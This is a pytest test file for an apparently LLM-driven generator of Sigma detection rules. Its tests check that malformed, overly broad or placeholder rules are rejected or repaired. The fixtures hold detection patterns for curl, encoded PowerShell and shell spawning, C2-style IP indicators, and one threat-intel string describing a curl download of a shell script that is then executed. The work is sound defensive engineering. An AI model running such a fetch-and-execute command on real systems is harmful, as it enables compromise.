        widened = _complete_indicator_lists(detection, self.SUPPLIED)
        assert widened["selection"]["DestinationIp"] == self.SUPPLIED["IPv4"]

    def test_only_the_matching_type_is_added(self):
        detection = {"selection": {"QueryName": "pipicka.xyz"}, "condition": "selection"}
        assert _complete_indicator_lists(detection, self.SUPPLIED)["selection"]["QueryName"] == "pipicka.xyz"

    def test_a_value_the_model_wrote_itself_is_left_alone(self):
        detection = {
            "selection": {"DestinationIp": ["166.88.134.62", "10.0.0.1"]},
            "condition": "selection",
        }
        assert _complete_indicator_lists(detection, self.SUPPLIED) == detection

    def test_a_negated_block_is_not_widened(self):
        detection = {
            "selection": {"Image|endswith": "\\curl.exe"},
            "filter": {"DestinationIp": "166.88.134.62"},
            "condition": "selection and not filter",
        }
        assert _complete_indicator_lists(detection, self.SUPPLIED) == detection

    def test_a_widened_rule_survives_the_full_build(self):
        rule = _rule(
            logsource_category="network_connection",
            title="C2 beacon",
            detection={"selection": {"DestinationIp": "166.88.134.62"}, "condition": "selection"},
        )
        built, problem = _agent()._build_rule(rule, _input(indicators=self.SUPPLIED))
        assert problem is None
        assert "193.247.144.38" in built.rule_yaml  # type: ignore


@pytest.mark.unit
class TestSelfDefeatingFilter:
    """An exclusion that removes the hunt's own attack path. Valid Sigma,
    passes every structural check, detects nothing it was written for."""

    def test_excluding_the_browser_on_a_browser_delivery_hunt_is_rejected(self):
        detection = {
            "selection": {"CommandLine|contains": "macsync"},
            "filter": {"ParentImage|contains": "/Applications/Safari.app"},
            "condition": "selection and not filter",
        }
        hypothesis = "Adversaries use poisoned SEO results to deliver MacSync Stealer to macOS users"
        problem = _self_defeating_filter_problem(detection, hypothesis)
        assert problem is not None
        assert "primary scenario" in problem

    def test_an_empty_filter_is_repaired_not_rejected(self):
        """Cosmetic, so it must not cost the draft its whole detection section.
        A rejected rule is not retried, and the selection may be perfectly
        good."""
        detection = {
            "selection": {"QueryName|contains": "evil-domain.test"},
            "filter": {},
            "condition": "selection and not filter",
        }
        repaired = _strip_empty_filters(detection)
        assert "filter" not in repaired
        assert repaired["condition"] == "selection"
        assert _self_defeating_filter_problem(repaired, "some hypothesis") is None

    def test_a_browser_filter_is_fine_when_delivery_is_not_browser_borne(self):
        """Narrow deliberately: excluding browser noise from, say, a scheduled
        task hunt is a reasonable filter, not a defect."""
        detection = {
            "selection": {"CommandLine|contains": "schtasks /create"},
            "filter": {"ParentImage|contains": "chrome.exe"},
            "condition": "selection and not filter",
        }
        hypothesis = "Adversaries establish persistence via scheduled tasks after SMB lateral movement"
        assert _self_defeating_filter_problem(detection, hypothesis) is None

    def test_a_rule_with_no_filter_passes(self):
        detection = {"selection": {"CommandLine|contains": "whoami"}, "condition": "selection"}
        assert _self_defeating_filter_problem(detection, "any hypothesis with download in it") is None


@pytest.mark.unit
class TestStripEmptyFilters:
    def test_and_not_filter_collapses_cleanly(self):
        detection = {"selection": {"a": "b"}, "filter": {}, "condition": "selection and not filter"}
        assert _strip_empty_filters(detection) == {"selection": {"a": "b"}, "condition": "selection"}

    def test_plain_and_filter_collapses_too(self):
        detection = {"selection": {"a": "b"}, "filter": {}, "condition": "selection and filter"}
        assert _strip_empty_filters(detection)["condition"] == "selection"

    def test_a_populated_filter_is_left_alone(self):
        detection = {
            "selection": {"a": "b"},
            "filter": {"x": "y"},
            "condition": "selection and not filter",
        }
        assert _strip_empty_filters(detection) == detection

    def test_a_detection_with_no_filter_is_unchanged(self):
        detection = {"selection": {"a": "b"}, "condition": "selection"}
        assert _strip_empty_filters(detection) == detection


@pytest.mark.unit
class TestAuthenticationLogSource:
    """Every other category is host/endpoint telemetry. Without this one, no
    credential-access technique mapped anywhere, so the derivation fell through
    to its process_creation fallback and the model was asked to detect
    credential stuffing in process command lines. It answered
    `CommandLine|contains: login` -- the best available answer to an impossible
    question."""

    @pytest.mark.parametrize("technique", ["T1110", "T1078", "T1098", "T1621", "T1550"])
    def test_credential_techniques_map_to_authentication(self, technique):
        assert applicable_logsources([technique], []) == ["authentication"]

    def test_the_drafted_hunts_technique_set_no_longer_falls_back(self):
        """H-0007 carried exactly these and got a process_creation rule."""
        assert applicable_logsources(["T1098", "T1110"], []) == ["authentication"]

    def test_sub_techniques_inherit_via_prefix_match(self):
        assert applicable_logsources(["T1110.003"], []) == ["authentication"]

    def test_the_category_is_accepted(self):
        assert "authentication" in VALID_LOGSOURCE_CATEGORIES

    def test_it_has_its_own_field_list(self):
        """A borrowed field name matches nothing and fails silently at
        conversion, so the prompt must not offer process fields here."""
        fields = _LOGSOURCE_FIELDS["authentication"]
        assert "TargetUserName" in fields
        assert "LogonType" in fields
        assert "CommandLine" not in fields
        assert "Image" not in fields

    def test_techniques_with_a_real_mapping_are_unaffected(self):
        assert applicable_logsources(["T1059"], []) == ["process_creation"]

    def test_a_rendered_authentication_rule_is_valid_sigma(self):
        rule = (
            "title: Repeated failed logons from one source\n"
            "id: 11111111-2222-3333-4444-555555555555\n"
            "status: experimental\n"
            "logsource:\n"
            "  category: authentication\n"
            "detection:\n"
            "  selection:\n"
            "    LogonType: 3\n"
            "    Status|contains: FAILURE\n"
            "  condition: selection\n"
            "level: medium\n"
        )
        assert _pysigma_problem(rule) is None

    def test_cloud_techniques_map_to_cloud_and_identity_audit(self):
        assert "cloud_audit" in applicable_logsources(["T1078.004"], [])
        assert "identity_audit" in applicable_logsources(["T1078.004"], [])
        assert "identity_audit" in applicable_logsources(["T1550.001"], [])
        assert applicable_logsources(["T1538"], []) == ["cloud_audit"]


@pytest.mark.unit
class TestLogSourceFallbackIsReported:
    def test_an_unmapped_technique_warns(self, caplog):
        """The fallback gave a credential-stuffing hunt a process_creation rule
        with no sign that its log source was a guess rather than a derivation."""
        import logging

        with caplog.at_level(logging.WARNING):
            assert applicable_logsources(["T9999"], []) == ["process_creation"]

        assert "falling back to process_creation" in caplog.text

    def test_a_mapped_technique_does_not_warn(self, caplog):
        import logging

        with caplog.at_level(logging.WARNING):
            applicable_logsources(["T1059"], [])

        assert "falling back" not in caplog.text


@pytest.mark.unit
class TestFieldTypeMismatch:
    """Both cases below are rules that reached production. The model fills
    whatever indicator it has into whatever field it picked, so a hunt whose
    only indicators were domains matched them against an address field. Valid
    Sigma, passes every other check, matches nothing on any backend ever."""

    @staticmethod
    def _det(field, value):
        return {"selection": {field: value}, "condition": "selection"}

    @pytest.mark.parametrize(
        "field,value",
        [
            ("IpAddress|endswith", ".jeetbot.cc"),
            ("IpAddress|contains", "telegram.org"),
            ("DestinationIp", "evil.example.test"),
        ],
    )
    def test_a_hostname_in_an_address_field_is_rejected(self, field, value):
        problem = _field_type_problem(self._det(field, value))
        assert problem is not None
        assert "never matches" in problem

    @pytest.mark.parametrize(
        "field,value",
        [
            ("IpAddress|endswith", ".133"),
            ("DestinationIp|contains", "192.168."),
            ("DestinationIp", "10.0.0.1"),
            ("DestinationIp", "2001:db8::1"),
            ("DestinationIp", "10.0.0.0/8"),
            ("IpAddress|re", r"^104\.194\.150\.21$|^144\.172\.64\.(60|99|128)$|^167\.88\.172\.97$"),
        ],
    )
    def test_address_values_and_fragments_pass(self, field, value):
        """`192.168.` and `.133` are legitimate contains/endswith idioms, and
        address regex patterns with alternations are valid when matched with |re."""
        assert _field_type_problem(self._det(field, value)) is None

    def test_a_domain_in_a_name_field_is_fine(self):
        """The check is about the field, not the value: QueryName is exactly
        where a domain belongs."""
        assert _field_type_problem(self._det("QueryName|contains", "telegram.org")) is None

    def test_a_non_numeric_port_is_rejected(self):
        problem = _field_type_problem(self._det("DestinationPort", "https"))
        assert problem is not None
        assert "port number" in problem

    def test_a_numeric_port_passes(self):
        assert _field_type_problem(self._det("DestinationPort", 443)) is None

    def test_list_values_are_checked_individually(self):
        detection = {
            "selection": {"DestinationIp": ["10.0.0.1", "evil.example.test"]},
            "condition": "selection",
        }
        assert _field_type_problem(detection) is not None


@pytest.mark.unit
class TestTechniqueMapCoverage:
    """Taken from the fallback warning's own output over four days of live
    drafting. Each of these fell through to process_creation, so the model was
    asked to express phishing or adversary-in-the-middle as process
    telemetry."""

    @pytest.mark.parametrize(
        "techniques",
        [
            ["T1566.002", "T1036"],
            ["T1566.001", "T1021.004"],
            ["T1203", "T1598"],
            ["T1068", "T1557"],
        ],
    )
    def test_previously_unmapped_sets_now_derive_real_log_sources(self, techniques, caplog):
        import logging

        with caplog.at_level(logging.WARNING):
            sources = applicable_logsources(techniques, [])

        assert sources
        assert "falling back" not in caplog.text

    def test_phishing_maps_to_delivery_telemetry_not_process(self):
        assert applicable_logsources(["T1566"], []) == ["file_event", "network_connection"]

    def test_adversary_in_the_middle_maps_to_network_and_auth(self):
        assert applicable_logsources(["T1557"], []) == ["authentication", "network_connection"]

    def test_a_hunt_with_no_techniques_still_falls_back(self):
        """Legitimate: there is nothing to derive from, and a rule beats none."""
        assert applicable_logsources([], []) == ["process_creation"]


@pytest.mark.unit
class TestAggregationConditions:
    """Sigma expresses "an unusual number of" with an aggregation after a pipe.
    The condition validator split the whole string on whitespace and read
    `count()`, `>` and `25` as undefined selection names, so every volume-based
    rule was discarded before pySigma ever saw it -- which is why zero of 92
    drafted rules carried a threshold and a credential-stuffing rule fired on a
    single failed logon."""

    F = staticmethod(SigmaGeneratorAgent._unresolved_condition_token)

    @pytest.mark.parametrize(
        "condition",
        [
            "selection | count() > 25",
            "selection | count(DestinationIp) by User > 10",
            "selection | min(field) >= 5",
            "selection | max(field) < 3",
            "selection | sum(bytes) > 1000",
            "selection | avg(field) = 7",
            "selection and not filter | count() > 25",
        ],
    )
    def test_valid_aggregations_are_accepted(self, condition):
        assert self.F(condition, ["selection", "filter"]) is None

    def test_near_takes_a_search_expression(self):
        assert self.F("selection | near filter", ["selection", "filter"]) is None

    def test_near_still_validates_its_selections(self):
        problem = self.F("selection | near missing", ["selection"])
        assert problem is not None
        assert "missing" in problem

    @pytest.mark.parametrize(
        "condition,fragment",
        [
            ("missing | count() > 5", "undefined selection"),
            ("selection | count() >", "not a Sigma aggregation"),
            ("selection | totally bogus", "not a Sigma aggregation"),
            ("selection |", "no aggregation"),
            ("selection | count() > many", "not a Sigma aggregation"),
        ],
    )
    def test_malformed_conditions_are_still_rejected(self, condition, fragment):
        """A malformed aggregation is valid YAML and looks like a threshold, so
        waving it through would put a rule that counts nothing in front of a
        reviewer."""
        problem = self.F(condition, ["selection"])
        assert problem is not None
        assert fragment in problem

    @pytest.mark.parametrize(
        "condition",
        ["selection", "selection and not filter", "selection or filter", "all of sel*"],
    )
    def test_plain_conditions_are_unaffected(self, condition):
        assert self.F(condition, ["selection", "filter", "sel1"]) is None

    def test_an_aggregation_survives_the_whole_build_and_pysigma(self):
        agent = SigmaGeneratorAgent(llm_enabled=False)
        raw = {
            "logsource_category": "authentication",
            "title": "Credential stuffing burst",
            "level": "medium",
            "detection": {
                "selection": {"Status|contains": "failure"},
                "condition": "selection | count() by TargetUserName > 25",
            },
            "falsepositives": ["Scheduled password rotation"],
        }
        inp = SigmaGenerationInput(
            hypothesis="Adversaries brute force SSO accounts",
            techniques=["T1110"],
            platforms=["Windows"],
        )
        rule, problem = agent._build_rule(raw, inp)
        assert problem is None, problem
        assert "count() by TargetUserName > 25" in rule.rule_yaml  # type: ignore
        assert _pysigma_problem(rule.rule_yaml) is None  # type: ignore


class TestBreadthProblem:
    """A rule matching only an extension or wildcard matches everything.

    Observed on H-0002: `Image|endswith: .exe` minus one NVIDIA filter.
    """

    @staticmethod
    def _det(selection: Dict[str, Any], condition: str = "selection") -> Dict[str, Any]:
        return {"selection": selection, "condition": condition}

    @pytest.mark.parametrize("value", [".exe", "*.exe", "*", ".dll", "\\"])
    def test_extension_or_wildcard_only_is_rejected(self, value):
        assert _breadth_problem(self._det({"Image|endswith": value})) is not None

    def test_h0002_process_rule_is_rejected(self):
        detection = {
            "selection": {"Image|endswith": ".exe"},
            "filter": {"OriginalFileName": "nvidia*.dll"},
            "condition": "selection and not filter",
        }
        assert "names no particular" in _breadth_problem(detection)  # type: ignore

    @pytest.mark.parametrize("value", ["\\nvidia-sysruntime.exe", "\\svchost.exe", "msbuild.exe", "exe"])
    def test_a_named_file_passes(self, value):
        assert _breadth_problem(self._det({"Image|endswith": value})) is None

    def test_one_specific_value_is_enough(self):
        selection = {"Image|endswith": ".exe", "ParentImage|endswith": "\\msbuild.exe"}
        assert _breadth_problem(self._det(selection)) is None

    def test_a_filter_value_does_not_make_the_rule_specific(self):
        detection = {
            "selection": {"Image|endswith": ".exe"},
            "filter": {"Image|startswith": "C:\\Windows\\System32\\svchost.exe"},
            "condition": "selection and not filter",
        }
        assert _breadth_problem(detection) is not None

    def test_a_positively_used_filter_block_counts_as_a_selection(self):
        """The model names a second positive block "filter" ("selection and filter")."""
        detection = {
            "selection": {"Image|endswith": ".exe"},
            "filter": {"Image|endswith": "\\nvidia-sysruntime.exe"},
            "condition": "selection and filter",
        }
        assert _breadth_problem(detection) is None

    def test_a_wildcard_negation_still_excludes_its_blocks(self):
        detection = {
            "selection": {"Image|endswith": ".exe"},
            "filter_vendor": {"Image|endswith": "\\nvidia-sysruntime.exe"},
            "condition": "selection and not 1 of filter_*",
        }
        assert _breadth_problem(detection) is not None

    def test_an_aggregation_makes_volume_the_signal(self):
        detection = self._det({"Image|endswith": ".exe"}, "selection | count() by Computer > 500")
        assert _breadth_problem(detection) is None

    def test_build_rule_rejects_a_broad_rule(self):
        rule = _rule(detection={"selection": {"Image|endswith": ".exe"}, "condition": "selection"})
        built, problem = _agent()._build_rule(rule, _input())
        assert built is None
        assert "names no particular" in problem  # type: ignore


def test_prompt_lists_the_drafts_observables():
    prompt = _agent()._build_prompt(_input(observables=["Process execution of nvidia-sysruntime.exe"]), "process_creation")
    assert "nvidia-sysruntime.exe" in prompt
    assert "unverified" in prompt


def test_prompt_says_none_when_there_are_no_observables():
    prompt = _agent()._build_prompt(_input(), "process_creation")
    assert "OBSERVABLES THE HUNT DRAFT NAMED" in prompt


class TestAnchorBareFilenames:
    """`Image` is a full path, so `Image: name.exe` never matches."""

    def test_a_bare_filename_on_a_path_field_is_anchored(self):
        detection = {"selection": {"Image": "nvidia-sysruntime.exe"}, "condition": "selection"}
        repaired = _anchor_bare_filenames(detection)
        assert repaired["selection"] == {"Image|endswith": "\\nvidia-sysruntime.exe"}
        assert repaired["condition"] == "selection"

    def test_a_list_of_bare_filenames_is_anchored(self):
        detection = {"selection": {"ParentImage": ["a.exe", "b.exe"]}, "condition": "selection"}
        assert _anchor_bare_filenames(detection)["selection"] == {"ParentImage|endswith": ["\\a.exe", "\\b.exe"]}

    @pytest.mark.parametrize(
        "field,value",
        [
            ("Image", "C:\\Windows\\System32\\svchost.exe"),
            ("Image", "*\\svchost.exe"),
            ("Image|endswith", "svchost.exe"),
            ("OriginalFileName", "svchost.exe"),
            ("CommandLine", "whoami"),
        ],
    )
    def test_everything_else_is_left_alone(self, field, value):
        detection = {"selection": {field: value}, "condition": "selection"}
        assert _anchor_bare_filenames(detection) == detection

    def test_build_rule_repairs_rather_than_rejects(self):
        rule = _rule(detection={"selection": {"Image": "nvidia-sysruntime.exe"}, "condition": "selection"})
        built, problem = _agent()._build_rule(rule, _input())
        assert problem is None
        assert "Image|endswith: \\nvidia-sysruntime.exe" in built.rule_yaml  # type: ignore


@pytest.mark.parametrize("value", ["malware", "Payload", "suspicious"])
def test_a_generic_noun_alone_is_a_placeholder(value):
    """H-0009: `TargetFilename|contains: malware`."""
    detection = {"selection": {"TargetFilename|contains": value}, "condition": "selection"}
    rule, reason = _agent()._build_rule(_rule(logsource_category="file_event", detection=detection), _input())
    assert rule is None
    assert reason is not None and "placeholder" in reason


def test_a_generic_noun_the_intel_supplied_is_kept():
    detection = {"selection": {"TargetFilename|contains": "payload"}, "condition": "selection"}
    rule, reason = _agent()._build_rule(
        _rule(logsource_category="file_event", detection=detection),
        _input(indicators={"filename": ["payload"]}),
    )
    assert rule is not None, reason


def test_a_lone_switch_is_too_broad():
    """H-0010: `CommandLine|contains: -enc` with nothing naming the process."""
    detection = {"selection": {"CommandLine|contains": "-enc"}, "condition": "selection"}
    rule, reason = _agent()._build_rule(_rule(detection=detection), _input())
    assert rule is None
    assert reason is not None and "names no particular" in reason


def test_a_switch_with_the_process_it_belongs_to_is_kept():
    detection = {
        "selection": {"Image|endswith": "\\powershell.exe", "CommandLine|contains": "-enc"},
        "condition": "selection",
    }
    rule, reason = _agent()._build_rule(_rule(detection=detection), _input())
    assert rule is not None, reason


def test_a_unix_path_in_a_registry_key_is_rejected():
    """H-0008: a registry_event rule on `TargetObject|endswith: /tmp/.applocktx`."""
    detection = {"selection": {"TargetObject|endswith": "/tmp/.applocktx"}, "condition": "selection"}
    rule, reason = _agent()._build_rule(_rule(logsource_category="registry_event", detection=detection), _input())
    assert rule is None
    assert reason is not None and "Unix file path" in reason


def test_a_registry_key_is_kept():
    detection = {
        "selection": {"TargetObject|contains": "\\Software\\Microsoft\\Windows\\CurrentVersion\\Run\\"},
        "condition": "selection",
    }
    rule, reason = _agent()._build_rule(_rule(logsource_category="registry_event", detection=detection), _input())
    assert rule is not None, reason


@pytest.mark.parametrize("value", ["198.51.100.0/24", "203.0.113.7", "192.0.2.0/25", "2001:db8::1"])
def test_a_documentation_range_is_a_placeholder(value):
    """H-0016 rerun: `DestinationIp|cidr: 198.51.100.0/24`, the RFC 5737 example range."""
    field = "DestinationIp|cidr" if "/" in value else "DestinationIp"
    detection = {"selection": {field: value}, "condition": "selection"}
    rule, reason = _agent()._build_rule(_rule(logsource_category="network_connection", detection=detection), _input())
    assert rule is None
    assert reason is not None and "documentation" in reason


def test_a_real_cidr_range_is_kept():
    detection = {
        "selection": {"Image|endswith": "\\rundll32.exe"},
        "filter": {"DestinationIp|cidr": "10.0.0.0/8"},
        "condition": "selection and not filter",
    }
    rule, reason = _agent()._build_rule(_rule(logsource_category="network_connection", detection=detection), _input())
    assert rule is not None, reason


@pytest.mark.parametrize("value", [".ps1", "\\update.vbs", "/tmp/x.sh"])
def test_a_script_as_process_image_is_rejected(value):
    """H-0018 rerun: `Image|endswith: .ps1` under `ParentImage|contains: teams.exe`."""
    detection = {
        "selection": {"Image|endswith": value, "ParentImage|endswith": "\\ms-teams.exe"},
        "condition": "selection",
    }
    rule, reason = _agent()._build_rule(_rule(detection=detection), _input())
    assert rule is None
    assert reason is not None and "script is never a process image" in reason


def test_a_script_in_the_command_line_is_kept():
    detection = {
        "selection": {"Image|endswith": "\\powershell.exe", "CommandLine|contains": "\\update.ps1"},
        "condition": "selection",
    }
    rule, reason = _agent()._build_rule(_rule(detection=detection), _input())
    assert rule is not None, reason


def test_unsupported_logsources_are_omitted_not_rejected():
    agent = SigmaGeneratorAgent(llm_enabled=True)
    sources = ["process_creation", "authentication"]

    def fake(prompt, *a, **k):
        if "authentication" in prompt:
            return json.dumps({"rules": []})
        return json.dumps({"rules": [_rule(logsource_category="process_creation")]})

    with patch.object(agent, "_call_llm_with_retry", side_effect=fake), patch.object(agent, "_get_provider") as provider:
        provider.return_value.provider_name = "test"
        result = agent.execute(_input(logsources=sources))

    assert result.success is True
    assert [r.logsource_category for r in result.data.rules] == ["process_creation"]
    assert result.data.rejected == []
    assert result.data.omitted == ["authentication: no rule returned"]
    assert not any("authentication" in w for w in result.warnings)


def test_cloud_control_plane_rules_generates_identity_and_cloud_audit():
    agent = SigmaGeneratorAgent(llm_enabled=False)
    input_data = _input(
        hypothesis="Adversary abused OAuth application consent grants and performed STS AssumeRole",
        threat_intel=(
            "Threat actor UNC-3882 created an illicit application registration MSFT-Health-Diagnostics-Worker "
            "and requested Directory.ReadWrite.All permission via Consent to application. Subsequently they "
            "called sts:AssumeRole to move laterally across accounts."
        ),
        techniques=["T1550.001", "T1078.004"],
    )
    rules = agent._cloud_control_plane_rules(input_data)
    assert len(rules) == 2
    cats = {rule.logsource_category for rule, prob in rules if rule}
    assert cats == {"identity_audit", "cloud_audit"}
    assert all(prob is None for _, prob in rules)

    import yaml

    id_rule = next(rule for rule, _ in rules if rule.logsource_category == "identity_audit")
    id_doc = yaml.safe_load(id_rule.rule_yaml)
    assert "Directory.ReadWrite.All" in id_doc["detection"]["selection"]["permissions|contains"]
    assert id_doc["logsource"] == {"category": "identity_audit"}

    cloud_rule = next(rule for rule, _ in rules if rule.logsource_category == "cloud_audit")
    cloud_doc = yaml.safe_load(cloud_rule.rule_yaml)
    assert cloud_doc["detection"]["selection"]["eventSource"] == "sts.amazonaws.com"
    assert cloud_doc["logsource"] == {"category": "cloud_audit"}


def test_platform_preservation_and_strict_alignment_prompt():
    agent = SigmaGeneratorAgent(config={"llm": {"provider": "none"}})
    input_windows = SigmaGenerationInput(
        hypothesis="Windows APT29 hunt",
        threat_intel="Adversary downloaded payload via curl http://1.2.3.4/shell.sh and executed /bin/sh",
        platforms=["Windows"],
        techniques=["T1059.003"],
    )
    prompt = agent._build_prompt(input_windows, "process_creation")
    assert "STRICT PLATFORM ALIGNMENT" in prompt
    assert "PLATFORMS: Windows" in prompt
    assert "If PLATFORMS is strictly Windows, you MUST NOT emit Linux/Unix paths" in prompt

    # Verify execute does not append linux when platforms is explicitly Windows
    # (even though threat_intel contains /bin/sh)
    # LLM is disabled, so it returns failure, but we check logsources/platforms behavior
    res = agent.execute(input_windows)
    assert not res.success  # No LLM configured


def test_a_model_rule_duplicating_source_guidance_is_dropped():
    """H-0025 kept a model rule for the same Node-RED-spawns-sh chain the
    source's own guidance (G4) already gave, and the model's copy was wrong."""
    from hecate_agent.agents.llm.sigma.models import SigmaRule
    from hecate_agent.agents.llm.sigma_generator import _drop_model_rules_covered_by_guidance

    guidance = SigmaRule(
        logsource_category="process_creation",
        title="Source guidance G4: Node launching sh",
        rule_yaml=yaml.safe_dump({"detection": {"selection": {
            "ParentImage|endswith": "/node", "ParentCommandLine|contains": "node-red",
            "Image|endswith": "/sh", "CommandLine|contains": " -c "}, "condition": "selection"}}),
        origin="deterministic",
    )
    duplicate = SigmaRule(
        logsource_category="process_creation",
        title="Node-RED Runtime Spawning Shell",
        rule_yaml=yaml.safe_dump({"detection": {"a": {"Image|endswith": "/usr/bin/node-red"},
                                                "b": {"CommandLine|contains": "/bin/sh"}, "condition": "a and b"}}),
    )
    distinct = SigmaRule(
        logsource_category="process_creation",
        title="Shell reads os-release",
        rule_yaml=yaml.safe_dump({"detection": {"selection": {"Image|endswith": "/cat",
                                                              "CommandLine|contains": "/etc/os-release"}, "condition": "selection"}}),
    )
    kept, dropped = _drop_model_rules_covered_by_guidance([guidance, duplicate, distinct])
    assert kept == [guidance, distinct]
    assert len(dropped) == 1 and "Node-RED Runtime Spawning Shell" in dropped[0]


def test_an_unauthenticated_claim_needs_a_field_that_records_authentication():
    """H-0026's "Unauthenticated Node-RED Flow Deployment" matched only POST /flows."""
    from hecate_agent.agents.llm.sigma_generator import _unobservable_auth_claim_problem

    detection = {"selection": {"cs-method|contains": "POST", "cs-uri-stem|contains": "/flows",
                               "c-useragent": "python-requests"}, "condition": "selection"}
    assert "records authentication" in (
        _unobservable_auth_claim_problem(detection, "Unauthenticated Node-RED Flow Deployment via Admin API") or ""
    )
    assert _unobservable_auth_claim_problem(detection, "Node-RED flow deployment via the admin API") is None
    with_user = {"selection": {"cs-uri-stem": "/flows", "cs-username": "-"}, "condition": "selection"}
    assert _unobservable_auth_claim_problem(with_user, "Unauthenticated flow deployment") is None


def test_an_outbound_connection_to_the_targets_listening_port_is_rejected():
    """H-0026 matched Node-RED initiating a connection to 1880, the port it listens on."""
    from hecate_agent.agents.llm.sigma_generator import _outbound_to_target_port_problem

    artifacts = [{"value": "1880", "kind": "port", "role": "network_target"}]
    outbound = {"selection": {"DestinationPort": 1880, "Image|endswith": "/node-red", "Initiated": True},
                "condition": "selection"}
    assert "inbound" in (_outbound_to_target_port_problem(outbound, "network_connection", artifacts) or "")
    inbound = {"selection": {"DestinationPort": 1880, "Initiated": False}, "condition": "selection"}
    assert _outbound_to_target_port_problem(inbound, "network_connection", artifacts) is None
    assert _outbound_to_target_port_problem(outbound, "network_connection", []) is None


def test_a_model_rule_duplicating_a_hunting_lead_is_dropped():
    """H-0026 kept the README's low POST /flows lead and a model copy at high."""
    from hecate_agent.agents.llm.sigma.models import SigmaRule
    from hecate_agent.agents.llm.sigma_generator import _drop_model_rules_covered_by_guidance

    lead = SigmaRule(
        logsource_category="webserver",
        title="Hunting lead: POST /flows as the PoC README documents",
        rule_yaml=yaml.safe_dump({"detection": {"selection": {"cs-method": "POST", "cs-uri-stem": "/flows"},
                                                "condition": "selection"}}),
        origin="deterministic",
    )
    copy = SigmaRule(
        logsource_category="webserver",
        title="Unauthenticated Node-RED Flow Deployment via Admin API",
        rule_yaml=yaml.safe_dump({"detection": {"selection": {"cs-method|contains": "POST",
                                                              "cs-uri-stem|contains": "/flows"},
                                                "condition": "selection"}}),
    )
    kept, dropped = _drop_model_rules_covered_by_guidance([lead, copy])
    assert kept == [lead] and len(dropped) == 1
